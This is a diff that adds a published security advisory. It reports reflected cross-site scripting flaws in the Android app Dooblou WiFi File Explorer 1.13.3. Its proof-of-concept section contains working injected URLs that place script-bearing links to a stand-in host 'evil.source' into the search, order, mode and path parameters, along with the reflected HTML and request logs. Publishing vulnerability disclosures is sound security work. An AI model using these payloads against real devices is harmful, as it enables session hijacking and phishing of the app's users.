@@ -1,0 +1,198 @@
+#Exploit Title: Dooblou WiFi File Explorer 1.13.3 - Multiple Vulnerabilities
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2317
+
+Release Date:
+=============
+2023-07-04
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2317
+
+Common Vulnerability Scoring System:
+====================================
+5.1
+
+Vulnerability Class:
+====================
+Multiple
+
+
+Current Estimated Price:
+========================
+500€ - 1.000€
+
+
+Product & Service Introduction:
+===============================
+Browse, download and stream individual files that are on your Android device, using a web browser via a WiFi connection.
+No more taking your phone apart to get the SD card out or grabbing your cable to access your camera pictures and copy across your favourite MP3s.
+
+(Copy of the Homepage:https://play.google.com/store/apps/details?id=com.dooblou.WiFiFileExplorer )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered multiple web vulnerabilities in the official Dooblou WiFi File Explorer 1.13.3 mobile android wifi web-application.
+
+Affected Product(s):
+====================
+Product Owner: dooblou
+Product: Dooblou WiFi File Explorer v1.13.3 - (Android) (Framework) (Wifi) (Web-Application)
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2022-01-19: Researcher Notification & Coordination (Security Researcher)
+2022-01-20: Vendor Notification (Security Department)
+2022-**-**: Vendor Response/Feedback (Security Department)
+2022-**-**: Vendor Fix/Patch (Service Developer Team)
+2022-**-**: Security Acknowledgements (Security Department)
+2023-07-04: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Authentication Type:
+====================
+Restricted Authentication (Guest Privileges)
+
+
+User Interaction:
+=================
+Low User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+Multiple input validation web vulnerabilities has been discovered in the official Dooblou WiFi File Explorer 1.13.3 mobile android wifi web-application.
+The vulnerability allows remote attackers to inject own malicious script codes with non-persistent attack vector to compromise browser to web-application
+requests from the application-side.
+
+The vulnerabilities are located in the `search`, `order`, `download`, `mode` parameters. The requested content via get method request is insecure validated
+and executes malicious script codes. The attack vector is non-persistent and the rquest method to inject is get. Attacker do not need to be authorized to
+perform an attack to execute malicious script codes. The links can be included as malformed upload for example to provoke an execute bby a view of the
+front- & backend of the wifi explorer.
+
+Successful exploitation of the vulnerability results in session hijacking, non-persistent phishing attacks, non-persistent external redirects to malicious
+source and non-persistent manipulation of affected application modules.
+
+
+Proof of Concept (PoC):
+=======================
+The input validation web vulnerabilities can be exploited by remote attackers without user account and with low user interaction.
+For security demonstration or to reproduce the web vulnerabilities follow the provided information and steps below to continue.
+
+
+PoC: Exploitation
+http://localhost:8000/storage/emulated/0/Download/<a href="https://evil.source" onmouseover=alert(document.domain)><br>PLEASE CLICK PATH TO RETURN INDEX</a>
+http://localhost:8000/storage/emulated/0/Download/?mode=31&search=%3Ca+href%3D%22https%3A%2F%2Fevil.source%22+onmouseover%3Dalert%28document.domain%29%3E%3Cbr%3EPLEASE+CLICK+PATH+TO+RETURN+INDEX%3C%2Fa%3E&x=3&y=3
+http://localhost:8000/storage/emulated/0/Download/?mode=%3Ca+href%3D%22https%3A%2F%2Fevil.source%22+onmouseover%3Dalert(document.domain)%3E%3Cbr%3EPLEASE+CLICK+PATH+TO+RETURN+INDEX&search=a&x=3&y=3
+http://localhost:8000/storage/emulated/?order=%3Ca+href%3D%22https%3A%2F%2Fevil.source%22+onmouseover%3Dalert(document.domain)%3E%3Cbr%3EPLEASE+CLICK+PATH+TO+RETURN+INDEX
+
+
+Vulnerable Sources: Execution Points
+<table width="100%" cellspacing="0" cellpadding="16" border="0"><tbody><tr><td
+style="vertical-align:top;"><table style="background-color: #FFA81E;
+background-image: url(/x99_dooblou_res/x99_dooblou_gradient.png);
+background-repeat: repeat-x; background-position:top;" width="700"
+cellspacing="3" cellpadding="5" border="0"><tbody><tr><td><center><span
+class="doob_large_text">ERROR</span></center></td></tr></tbody></table><br><tabl
+e style="background-color: #B2B2B2; background-image:
+url(/x99_dooblou_res/x99_dooblou_gradient.png); background-repeat: repeat-x; background-position:top;" width="700" cellspacing="3" cellpadding="5" border="0">
+<tbody><tr><td><span class="doob_medium_text">Cannot find file or
+directory! /storage/emulated/0/Download/<a href="https://evil.source" onmouseover="alert(document.domain)"><br>PLEASE CLICK USER PATH TO RETURN
+INDEX</a></span></td></tr></tbody></table><br><span class="doob_medium_text"><span class="doob_link">&nbsp;&nbsp;<a
+href="/">>>&nbsp;Back To
+Files&nbsp;>></a></span></span><br></td></tr></tbody></table><br>
+-
+<li></li></ul></span></span></td></tr></tbody></table></div><div class="body row scroll-x scroll-y"><table width="100%" cellspacing="0" cellpadding="6" border="0"><tbody><tr>
+<td style="vertical-align:top;" width="100%"><form name="multiSelect" style="margin: 0px; padding: 0px;" action="/storage/emulated/0/Download/" enctype="multipart/form-data" method="POST">
+<input type="hidden" name="fileNames" value=""><table width="100%" cellspacing="0" cellpadding="1" border="0" bgcolor="#000000"><tbody><tr><td>
+<table width="100%" cellspacing="2" cellpadding="3" border="0" bgcolor="#FFFFFF"><tbody><tr style="background-color: #FFA81E; background-image: url(/x99_dooblou_res/x99_dooblou_gradient.png);
+background-repeat: repeat-x; background-position:top;" height="30"><td colspan="5"><table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="white-space:
+nowrap;vertical-align:middle"><span class="doob_small_text_bold">&nbsp;</span></td><td style="white-space: nowrap;vertical-align:middle" align="right"><span class="doob_small_text_bold">
+&nbsp;&nbsp;&nbsp;&nbsp;<a href="?view=23&mode=<a href=" https:="" evil.source"="" onmouseover="alert(document.domain)"><br>PLEASE CLICK PATH TO RETURN INDEX&search=a">
+<img style="vertical-align:middle;border-style: none" src="/x99_dooblou_res/x99_dooblou_details.png" alt="img" title="Details"></a>&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;
+<a href="?view=24&mode=<a href=" https:="" evil.source"="" onmouseover="alert(document.domain)"><br>PLEASE CLICK PATH TO RETURN INDEX&search=a">
+<img style="vertical-align:middle;border-style: none" src="/x99_dooblou_res/x99_dooblou_thumbnails.png" alt="img" title="Thumbnails"></a>&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;
+<a href="?view=38&mode=<a href=" https:="" evil.source"="" onmouseover="alert(document.domain)"><br>PLEASE CLICK PATH TO RETURN I
+-
+<td style="white-space: nowrap;vertical-align:middle"><input value="" type="checkbox" name="selectAll" onclick="setCheckAll();">&nbsp;&nbsp;<a class="doob_button"
+href="javascript:setMultiSelect('/storage/emulated/', 'action', '18&order=>" <<="">>"<a href="https://evil.source" onmouseover=alert(document.domain)">');javascript:document.multiSelect.submit();"
+style="">Download</a>&nbsp;<a class="doob_button" href="javascript:setMultiSelectConfirm('Are you sure you want to delete? This cannot be undone!', '/storage/emulated/', 'action',
+'13&order=>"<<><a href="https://evil.source" onmouseover=alert(document.domain)>');javascript:document.multiSelect.submit();" style="">Delete</a>&nbsp;
+<a class="doob_button" href='javascript:setMultiSelectPromptQuery("Create Copy",
+"/storage/emulated/", "/storage/emulated/", "action", "35&order=>"<<<a href="https://evil.source" onmouseover=alert(document.domain)>", "name");javascript:document.multiSelect.submit();'
+style="">Create Copy</a>&nbsp;<a class="doob_button" href="x99_dooblou_pro_version.html" style="">Zip</a>&nbsp;<a class="doob_button" href="x99_dooblou_pro_version.html" style="">Unzip</a></td>
+<td align="right" style="white-space: nowrap;vertical-align:middle"><span class="doob_small_text_bold">&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:showTreeview()"><img style="vertical-align:middle;border-style:
+none" src="/x99_dooblou_res/x99_dooblou_tree_dark.png" alt="img" title="Show Treeview"></a>&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;
+<a href="?view=23&order=>"<<><a href="https://evil.source" onmouseover=alert(document.domain)>"><img style="vertical-align:middle;border-style: none" src="/x99_dooblou_res/x99_dooblou_details.png" alt="img"
+title="Details"></a>&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;<a href="?view=24&order=>"<<><a href="https://evil.source" onmouseover=alert(document.domain)>"><img style="vertical-align:middle;border-style:
+none" src="/x99_dooblou_res/x99_dooblou_thumbnails.png" alt="img" title="Thumbnails"></a>&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;
+<a href="?view=38&order=>"<<><a href="https://evil.source" onmouseover=alert(document.domain)>"><img style="vertical-align:middle;border-style: none" src="/x99_dooblou_res/x99_dooblou_grid.png" alt="img"
+title="Thumbnails"></a>&nbsp;&nbsp;&nbsp;&nbsp;</span></td></tr></table>
+
+
+---PoC Session Logs ---
+http://localhost:8000/storage/emulated/0/Download/<a href="https://evil.source" onmouseover=alert(document.domain)><br>PLEASE CLICK USER PATH TO RETURN INDEX</x99_dooblou_wifi_signal_strength.xml
+Host: localhost:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer:http://localhost:8000/storage/emulated/0/Download/%3Ca%20href=%22https://evil.source%22%20onmouseover=alert(document.domain)%3E%3Cbr%3EPLEASE%20CLICK%20USER%20PATH%20TO%20RETURN%20INDEX%3C/a%3E
+GET: HTTP/1.1 200 OK
+Cache-Control: no-cache
+Content-Type: text/xml
+-
+http://localhost:8000/storage/emulated/0/Download/?mode=<a+href%3D"https%3A%2F%2Fevil.source"+onmouseover%3Dalert(document.domain)><br>PLEASE+CLICK+PATH+TO+RETURN+INDEX&search=a&x=3&y=3
+Host: localhost:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Cookie: treeview=0
+Upgrade-Insecure-Requests: 1
+GET: HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Type: text/html
+-
+http://localhost:8000/storage/emulated/0/Download/<a href="https://evil.source" onmouseover=alert(document.domain)><br>PLEASE CLICK USER PATH TO RETURN INDEX</x99_dooblou_wifi_signal_strength.xml
+Host: localhost:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer:http://localhost:8000/storage/emulated/0/Download/%<a href="https://evil.source" onmouseover=alert(document.domain)>%3E%3Cbr%3EPLEASE%20CLICK%20USER%20PATH%20TO%20RETURN%20INDEX%3C/a%3E
+GET: HTTP/1.1 200 OK
+Cache-Control: no-cache
+Content-Type: text/xml
+
+
+Security Risk:
+==============
+The security risk of the multiple web vulnerabilities in the ios mobile wifi web-application are estimated as medium.
